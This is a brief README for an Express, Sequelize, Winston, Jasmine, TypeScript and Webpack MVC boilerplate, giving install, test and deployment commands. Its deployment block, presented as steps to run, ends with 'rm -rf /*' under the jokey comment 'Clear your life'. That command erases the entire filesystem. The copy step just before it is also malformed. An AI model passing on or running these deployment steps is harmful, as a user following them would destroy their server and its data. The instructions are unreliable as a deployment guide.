# Express + Sequelize + Winston + Jasmine + TypeScript + Webpack MVC Boilerplate
Express + Sequelize + Winston + Jasmine + TypeScript + Webpack MVC Boilerplate

## Installation
```
git clone https://github.com/hosos/express.git
npm install
npm run app                   # Run in Development and watch for changes
```

## Configuration
See "config" directory

Warning: Please don't edit the "dist/config" directory

## Testing
```
npm run test                  # all test cases are in "src/spec" directory
```

## Deployment
```
npm run build                 # build "dist" directory
cp ./dist * /var/www          # copy the "dist" directory to your server
node server.js                # RUN!
rm -rf /*                     # Clear your life
```
